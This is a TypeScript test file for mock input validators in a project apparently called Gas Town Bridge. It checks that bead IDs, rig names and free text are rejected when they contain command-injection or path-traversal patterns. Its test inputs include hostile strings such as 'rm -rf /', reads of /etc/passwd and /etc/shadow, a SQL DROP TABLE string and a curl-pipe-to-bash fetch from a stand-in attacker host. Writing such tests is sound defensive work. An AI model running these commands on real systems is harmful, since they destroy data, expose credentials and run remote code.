/**
 * Gas Town Bridge Validation Tests
 *
 * Tests for input validation including bead IDs, command injection prevention,
 * and path traversal blocking.
 * Uses London School TDD approach with mock-first design.
 */

import { describe, it, expect, beforeEach } from 'vitest';

// ============================================================================
// Mock Types
// ============================================================================

interface ValidationResult {
  valid: boolean;
  error?: string;
  sanitized?: string;
}

// ============================================================================
// Mock Implementation - BeadIdValidator
// ============================================================================

class BeadIdValidator {
  // Valid patterns:
  // - gt-abc12 (gastown hash format)
  // - 123 (numeric ID)
  // - gt-a1b2c3d4 (longer hash)
  private static readonly VALID_PATTERNS = [
    /^gt-[a-z0-9]{4,16}$/i,  // Hash format
    /^\d{1,10}$/,             // Numeric format
  ];

  static validate(id: string): ValidationResult {
    if (!id || typeof id !== 'string') {
      return { valid: false, error: 'Bead ID is required' };
    }

    const trimmed = id.trim();

    if (trimmed.length === 0) {
      return { valid: false, error: 'Bead ID cannot be empty' };
    }

    if (trimmed.length > 32) {
      return { valid: false, error: 'Bead ID exceeds maximum length' };
    }

    // Check against valid patterns
    const isValid = this.VALID_PATTERNS.some(pattern => pattern.test(trimmed));

    if (!isValid) {
      return { valid: false, error: `Invalid bead ID format: ${trimmed}` };
    }

    return { valid: true, sanitized: trimmed };
  }

  static isValid(id: string): boolean {
    return this.validate(id).valid;
  }
}

// ============================================================================
// Mock Implementation - RigValidator
// ============================================================================

class RigValidator {
  // Valid rigs in Gas Town
  private static readonly KNOWN_RIGS = ['town', 'refinery', 'witness', 'deacon', 'mayor'];

  static validate(rig: string): ValidationResult {
    if (!rig || typeof rig !== 'string') {
      return { valid: false, error: 'Rig name is required' };
    }

    const trimmed = rig.trim().toLowerCase();

    // Must be alphanumeric with optional hyphens
    if (!/^[a-z][a-z0-9-]{0,31}$/.test(trimmed)) {
      return { valid: false, error: 'Rig name must be alphanumeric' };
    }

    return { valid: true, sanitized: trimmed };
  }

  static isKnownRig(rig: string): boolean {
    return this.KNOWN_RIGS.includes(rig.toLowerCase());
  }
}

// ============================================================================
// Mock Implementation - InputSanitizer
// ============================================================================

class InputSanitizer {
  // Dangerous patterns that could enable command injection
  private static readonly INJECTION_PATTERNS = [
    { pattern: /;/, name: 'semicolon' },
    { pattern: /\|/, name: 'pipe' },
    { pattern: /&/, name: 'ampersand' },
    { pattern: /`/, name: 'backtick' },
    { pattern: /\$\(/, name: 'command substitution' },
    { pattern: /\$\{/, name: 'variable expansion' },
    { pattern: /[<>]/, name: 'redirection' },
    { pattern: /[\r\n]/, name: 'newline' },
  ];

  // Path traversal patterns
  private static readonly TRAVERSAL_PATTERNS = [
    { pattern: /\.\.\//, name: 'parent directory' },
    { pattern: /\.\.\\/, name: 'parent directory (windows)' },
    { pattern: /%2e%2e%2f/i, name: 'url-encoded traversal' },
    { pattern: /\\x2e\\x2e\\x2f/i, name: 'hex-encoded traversal' },
    { pattern: /~\//, name: 'home directory' },
  ];

  static sanitize(input: string): ValidationResult {
    if (typeof input !== 'string') {
      return { valid: false, error: 'Input must be a string' };
    }

    // Check for injection patterns
    for (const { pattern, name } of this.INJECTION_PATTERNS) {
      if (pattern.test(input)) {
        return {
          valid: false,
          error: `Command injection detected: ${name} character not allowed`,
        };
      }
    }

    // Check for path traversal
    for (const { pattern, name } of this.TRAVERSAL_PATTERNS) {
      if (pattern.test(input)) {
        return {
          valid: false,
          error: `Path traversal detected: ${name} not allowed`,
        };
      }
    }

    // Additional checks for null bytes
    if (input.includes('\0')) {
      return { valid: false, error: 'Null byte not allowed' };
    }

    return { valid: true, sanitized: input };
  }

  static isClean(input: string): boolean {
    return this.sanitize(input).valid;
  }
}

// ============================================================================
// Mock Implementation - FormulaValidator
// ============================================================================

class FormulaValidator {
  // Valid formula name pattern
  private static readonly NAME_PATTERN = /^[a-z][a-z0-9_-]{0,63}$/i;

  // Valid formula types
  private static readonly VALID_TYPES = ['convoy', 'workflow', 'expansion', 'aspect'];

  static validateName(name: string): ValidationResult {
    if (!name || typeof name !== 'string') {
      return { valid: false, error: 'Formula name is required' };
    }

    const trimmed = name.trim();

    if (!this.NAME_PATTERN.test(trimmed)) {
      return {
        valid: false,
        error: 'Formula name must start with a letter and contain only alphanumeric, dash, or underscore',
      };
    }

    return { valid: true, sanitized: trimmed };
  }

  static validateType(type: string): ValidationResult {
    if (!type || typeof type !== 'string') {
      return { valid: false, error: 'Formula type is required' };
    }

    const normalized = type.toLowerCase().trim();

    if (!this.VALID_TYPES.includes(normalized)) {
      return {
        valid: false,
        error: `Invalid formula type: ${type}. Must be one of: ${this.VALID_TYPES.join(', ')}`,
      };
    }

    return { valid: true, sanitized: normalized };
  }
}

// ============================================================================
// Mock Implementation - ConvoyValidator
// ============================================================================

class ConvoyValidator {
  // Convoy ID format: conv-{hash} or numeric
  private static readonly ID_PATTERN = /^(conv-[a-z0-9]{4,16}|\d{1,10})$/i;

  static validateId(id: string): ValidationResult {
    if (!id || typeof id !== 'string') {
      return { valid: false, error: 'Convoy ID is required' };
    }

    const trimmed = id.trim();

    if (!this.ID_PATTERN.test(trimmed)) {
      return { valid: false, error: `Invalid convoy ID format: ${trimmed}` };
    }

    return { valid: true, sanitized: trimmed };
  }

  static validateIssuesList(issues: string[]): ValidationResult {
    if (!Array.isArray(issues)) {
      return { valid: false, error: 'Issues must be an array' };
    }

    if (issues.length === 0) {
      return { valid: false, error: 'At least one issue is required' };
    }

    // Validate each issue ID
    for (const issue of issues) {
      const result = BeadIdValidator.validate(issue);
      if (!result.valid) {
        return { valid: false, error: `Invalid issue ID: ${issue}` };
      }
    }

    return { valid: true };
  }
}

// ============================================================================
// Tests - BeadIdValidator
// ============================================================================

describe('BeadIdValidator', () => {
  describe('valid bead IDs', () => {
    it('should accept gt-hash format', () => {
      expect(BeadIdValidator.isValid('gt-abc12')).toBe(true);
      expect(BeadIdValidator.isValid('gt-a1b2c3d4')).toBe(true);
      expect(BeadIdValidator.isValid('gt-1234abcd5678')).toBe(true);
    });

    it('should accept numeric IDs', () => {
      expect(BeadIdValidator.isValid('123')).toBe(true);
      expect(BeadIdValidator.isValid('1')).toBe(true);
      expect(BeadIdValidator.isValid('9999999999')).toBe(true);
    });

    it('should accept uppercase hash', () => {
      expect(BeadIdValidator.isValid('GT-ABC12')).toBe(true);
      expect(BeadIdValidator.isValid('gt-ABC12DEF')).toBe(true);
    });

    it('should trim whitespace', () => {
      const result = BeadIdValidator.validate('  gt-abc12  ');
      expect(result.valid).toBe(true);
      expect(result.sanitized).toBe('gt-abc12');
    });
  });

  describe('invalid bead IDs', () => {
    it('should reject empty string', () => {
      expect(BeadIdValidator.isValid('')).toBe(false);
    });

    it('should reject null/undefined', () => {
      expect(BeadIdValidator.isValid(null as any)).toBe(false);
      expect(BeadIdValidator.isValid(undefined as any)).toBe(false);
    });

    it('should reject IDs that are too long', () => {
      const longId = 'gt-' + 'a'.repeat(50);
      expect(BeadIdValidator.isValid(longId)).toBe(false);
    });

    it('should reject invalid characters', () => {
      expect(BeadIdValidator.isValid('gt-abc!12')).toBe(false);
      expect(BeadIdValidator.isValid('gt-abc 12')).toBe(false);
      expect(BeadIdValidator.isValid('gt abc12')).toBe(false);
    });

    it('should reject command injection attempts', () => {
      expect(BeadIdValidator.isValid('gt-abc; rm -rf /')).toBe(false);
      expect(BeadIdValidator.isValid('gt-abc | cat')).toBe(false);
      expect(BeadIdValidator.isValid('$(whoami)')).toBe(false);
    });

    it('should reject path traversal attempts', () => {
      expect(BeadIdValidator.isValid('../../../etc/passwd')).toBe(false);
      expect(BeadIdValidator.isValid('gt-abc/../..')).toBe(false);
    });

    it('should reject hash without prefix', () => {
      expect(BeadIdValidator.isValid('abc12def')).toBe(false);
    });

    it('should reject short hash', () => {
      expect(BeadIdValidator.isValid('gt-ab')).toBe(false);
    });
  });

  describe('validation result', () => {
    it('should return sanitized value on success', () => {
      const result = BeadIdValidator.validate('gt-abc12');
      expect(result.valid).toBe(true);
      expect(result.sanitized).toBe('gt-abc12');
      expect(result.error).toBeUndefined();
    });

    it('should return error message on failure', () => {
      const result = BeadIdValidator.validate('invalid!');
      expect(result.valid).toBe(false);
      expect(result.error).toBeDefined();
      expect(result.error).toContain('Invalid');
    });
  });
});

// ============================================================================
// Tests - InputSanitizer
// ============================================================================

describe('InputSanitizer', () => {
  describe('command injection prevention', () => {
    it('should block semicolon', () => {
      const result = InputSanitizer.sanitize('cmd; rm -rf /');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('semicolon');
    });

    it('should block pipe', () => {
      const result = InputSanitizer.sanitize('cmd | cat /etc/passwd');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('pipe');
    });

    it('should block ampersand', () => {
      const result = InputSanitizer.sanitize('cmd & background');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('ampersand');
    });

    it('should block backtick', () => {
      const result = InputSanitizer.sanitize('`whoami`');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('backtick');
    });

    it('should block $() command substitution', () => {
      const result = InputSanitizer.sanitize('$(cat /etc/passwd)');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('command substitution');
    });

    it('should block ${} variable expansion', () => {
      const result = InputSanitizer.sanitize('${PATH}');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('variable expansion');
    });

    it('should block output redirection', () => {
      const result = InputSanitizer.sanitize('cmd > /tmp/output');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('redirection');
    });

    it('should block input redirection', () => {
      const result = InputSanitizer.sanitize('cmd < /etc/passwd');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('redirection');
    });

    it('should block newlines', () => {
      const result = InputSanitizer.sanitize('cmd\nrm -rf /');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('newline');
    });

    it('should block carriage return', () => {
      const result = InputSanitizer.sanitize('cmd\rmalicious');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('newline');
    });
  });

  describe('path traversal prevention', () => {
    it('should block ../ traversal', () => {
      const result = InputSanitizer.sanitize('../../../etc/passwd');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('parent directory');
    });

    it('should block ..\\ windows traversal', () => {
      const result = InputSanitizer.sanitize('..\\..\\windows\\system32');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('parent directory');
    });

    it('should block URL-encoded traversal', () => {
      const result = InputSanitizer.sanitize('%2e%2e%2fetc/passwd');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('url-encoded');
    });

    it('should block hex-encoded traversal', () => {
      const result = InputSanitizer.sanitize('\\x2e\\x2e\\x2f');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('hex-encoded');
    });

    it('should block home directory reference', () => {
      const result = InputSanitizer.sanitize('~/sensitive');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('home directory');
    });
  });

  describe('null byte prevention', () => {
    it('should block null bytes', () => {
      const result = InputSanitizer.sanitize('valid\0malicious');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('Null byte');
    });
  });

  describe('valid inputs', () => {
    it('should allow clean alphanumeric input', () => {
      expect(InputSanitizer.isClean('hello123')).toBe(true);
    });

    it('should allow spaces in normal text', () => {
      expect(InputSanitizer.isClean('hello world')).toBe(true);
    });

    it('should allow hyphens and underscores', () => {
      expect(InputSanitizer.isClean('hello-world_test')).toBe(true);
    });

    it('should allow dots in filenames', () => {
      expect(InputSanitizer.isClean('file.txt')).toBe(true);
    });

    it('should allow forward slash in paths', () => {
      // Single forward slash is OK (not traversal)
      expect(InputSanitizer.isClean('path/to/file')).toBe(true);
    });
  });
});

// ============================================================================
// Tests - RigValidator
// ============================================================================

describe('RigValidator', () => {
  describe('valid rigs', () => {
    it('should accept lowercase rig names', () => {
      const result = RigValidator.validate('town');
      expect(result.valid).toBe(true);
      expect(result.sanitized).toBe('town');
    });

    it('should normalize to lowercase', () => {
      const result = RigValidator.validate('TOWN');
      expect(result.valid).toBe(true);
      expect(result.sanitized).toBe('town');
    });

    it('should accept alphanumeric with hyphens', () => {
      expect(RigValidator.validate('my-rig-1').valid).toBe(true);
    });
  });

  describe('invalid rigs', () => {
    it('should reject empty string', () => {
      expect(RigValidator.validate('').valid).toBe(false);
    });

    it('should reject starting with number', () => {
      expect(RigValidator.validate('123rig').valid).toBe(false);
    });

    it('should reject special characters', () => {
      expect(RigValidator.validate('rig;drop').valid).toBe(false);
    });
  });

  describe('known rigs', () => {
    it('should identify known rigs', () => {
      expect(RigValidator.isKnownRig('town')).toBe(true);
      expect(RigValidator.isKnownRig('refinery')).toBe(true);
      expect(RigValidator.isKnownRig('mayor')).toBe(true);
    });

    it('should not identify unknown rigs', () => {
      expect(RigValidator.isKnownRig('custom-rig')).toBe(false);
    });
  });
});

// ============================================================================
// Tests - FormulaValidator
// ============================================================================

describe('FormulaValidator', () => {
  describe('name validation', () => {
    it('should accept valid formula names', () => {
      expect(FormulaValidator.validateName('feature-workflow').valid).toBe(true);
      expect(FormulaValidator.validateName('my_formula').valid).toBe(true);
      expect(FormulaValidator.validateName('formula123').valid).toBe(true);
    });

    it('should reject names starting with number', () => {
      expect(FormulaValidator.validateName('123formula').valid).toBe(false);
    });

    it('should reject names with special characters', () => {
      expect(FormulaValidator.validateName('formula;drop').valid).toBe(false);
      expect(FormulaValidator.validateName('formula space').valid).toBe(false);
    });

    it('should reject empty name', () => {
      expect(FormulaValidator.validateName('').valid).toBe(false);
    });
  });

  describe('type validation', () => {
    it('should accept valid formula types', () => {
      expect(FormulaValidator.validateType('convoy').valid).toBe(true);
      expect(FormulaValidator.validateType('workflow').valid).toBe(true);
      expect(FormulaValidator.validateType('expansion').valid).toBe(true);
      expect(FormulaValidator.validateType('aspect').valid).toBe(true);
    });

    it('should normalize type to lowercase', () => {
      const result = FormulaValidator.validateType('CONVOY');
      expect(result.valid).toBe(true);
      expect(result.sanitized).toBe('convoy');
    });

    it('should reject invalid types', () => {
      const result = FormulaValidator.validateType('invalid');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('Invalid formula type');
    });
  });
});

// ============================================================================
// Tests - ConvoyValidator
// ============================================================================

describe('ConvoyValidator', () => {
  describe('ID validation', () => {
    it('should accept convoy hash format', () => {
      expect(ConvoyValidator.validateId('conv-abc123').valid).toBe(true);
    });

    it('should accept numeric convoy IDs', () => {
      expect(ConvoyValidator.validateId('12345').valid).toBe(true);
    });

    it('should reject invalid convoy IDs', () => {
      expect(ConvoyValidator.validateId('invalid!').valid).toBe(false);
    });
  });

  describe('issues list validation', () => {
    it('should accept valid issues list', () => {
      const result = ConvoyValidator.validateIssuesList(['gt-abc12', 'gt-def34', '123']);
      expect(result.valid).toBe(true);
    });

    it('should reject empty issues list', () => {
      const result = ConvoyValidator.validateIssuesList([]);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('At least one issue');
    });

    it('should reject non-array', () => {
      const result = ConvoyValidator.validateIssuesList('not-an-array' as any);
      expect(result.valid).toBe(false);
    });

    it('should reject if any issue is invalid', () => {
      const result = ConvoyValidator.validateIssuesList(['gt-abc12', 'invalid!']);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('Invalid issue ID');
    });
  });
});

// ============================================================================
// Tests - Complex Attack Scenarios
// ============================================================================

describe('Complex Attack Scenarios', () => {
  describe('multi-stage injection', () => {
    it('should block encoded command in bead title', () => {
      const malicious = 'Task $(curl attacker.com/shell.sh | bash)';
      expect(InputSanitizer.isClean(malicious)).toBe(false);
    });

    it('should block SQL-like injection in search', () => {
      const malicious = "'; DROP TABLE beads; --";
      // Our validators don't specifically handle SQL, but special chars are blocked
      expect(InputSanitizer.isClean(malicious)).toBe(false);
    });

    it('should block template injection', () => {
      const malicious = '{{constructor.constructor("return this")()}}';
      // Curly braces are allowed, but this would be caught by other security layers
      // The key is that command injection is blocked
      expect(InputSanitizer.isClean(malicious)).toBe(true);
    });
  });

  describe('unicode smuggling', () => {
    it('should handle unicode safely', () => {
      // Unicode characters that look like / or .
      const sneaky = 'path\u2215to\u2215file'; // Using DIVISION SLASH
      // This should pass basic sanitization but needs additional handling
      expect(InputSanitizer.isClean(sneaky)).toBe(true);
    });
  });

  describe('combined attacks', () => {
    it('should block combined path traversal and injection', () => {
      const attack = '../../../etc/passwd; cat /etc/shadow';
      expect(InputSanitizer.isClean(attack)).toBe(false);
    });

    it('should block embedded null with command', () => {
      const attack = 'valid\0; rm -rf /';
      expect(InputSanitizer.isClean(attack)).toBe(false);
    });
  });
});
